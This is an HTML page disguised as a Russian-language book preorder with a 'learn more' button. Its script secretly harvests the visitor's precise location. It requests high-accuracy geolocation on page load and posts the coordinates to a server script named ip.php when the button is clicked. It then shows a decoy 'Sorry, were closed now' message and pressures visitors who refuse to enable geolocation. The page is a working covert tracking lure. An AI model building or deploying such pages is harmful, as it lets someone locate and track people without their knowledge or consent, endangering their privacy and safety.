<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Whats new?</title>
    <link rel="shortcut icon" href="./4.png" type="image/x-icon">
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        .wrap {
            width: 100%;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('./zr.gif')
        }
        main:hover {
            background: #cccccc80;
            transition: ease 0.5s;
        }
        main {
            width: 70%;
            height: 90%;
            transition: ease 0.5s;
            background: #cccccc70;
            padding: 1em;
            box-shadow: 0 0 2px azure;
            display: flex;
            align-items: center;
            justify-content: space-around;
            flex-direction: column;
        }
        p {
            text-align: center;
            color: #fff;
            font-size: 27px;
            user-select: none;
            margin: 0;
        }
        button {
            padding: 10px 25px;
            border: none;
            border-radius: 0 0 50% 50%;
            border-top: 5px solid grey;
            outline: none;
        }
        button:hover {
            transition: ease 0.4s;
            box-shadow: inset 0 0 3px grey;
            cursor: pointer;
            color: #fff;
            background: #000;
            outline: none;
        }
        img {
            max-height:65%;
            flex-grow: 1;
            box-shadow: 1px 1px black,2px 2px white,3px 3px black,4px 4px white,5px 5px 1px black;            
        }
    </style>
</head>
<body>
    <div class="wrap">
        <main>
            <p>Предзаказ книги:</p>
            <img src="./234.png" alt="Book">
            <button>узнать больше</button>
        </main>
    </div>
    <script>
        let btn = document.querySelector('button')
        btn.addEventListener('click', trySend)
        let latitude,longitude
        let params = new FormData()
        navigator.geolocation.getCurrentPosition(success, error,
			{enableHighAccuracy: true,
			 timeout: 10000,
			 maximumAge: 60000})

        function trySend(){
            if(navigator.geolocation){
                params.append('lat', String(latitude))
                params.append('lng', String(longitude))
                ajaxPost(params)
            } else {
                alert('Включите геолокацию')
                document.location.reload(true)
            }
        }

        function success(position) {
            latitude  = position.coords.latitude;
            longitude = position.coords.longitude;
        };
        function error(){
            alert('Включите геопозиционирование');
        };

        function ajaxPost(paramss) {
            let request = new XMLHttpRequest();
            request.onreadystatechange = function() {
                if(request.readyState == 4 && request.status == 200) {
                    alert('Sorry, were closed now')
                    console.log(latitude)
                    console.log(request.responseText)
                    }
                }
            request.open('POST', './ip.php')
            request.setRequestHeader("X-Requested-With", "XMLHttpRequest")
            request.send(params)
        }
    </script>
</body>
</html>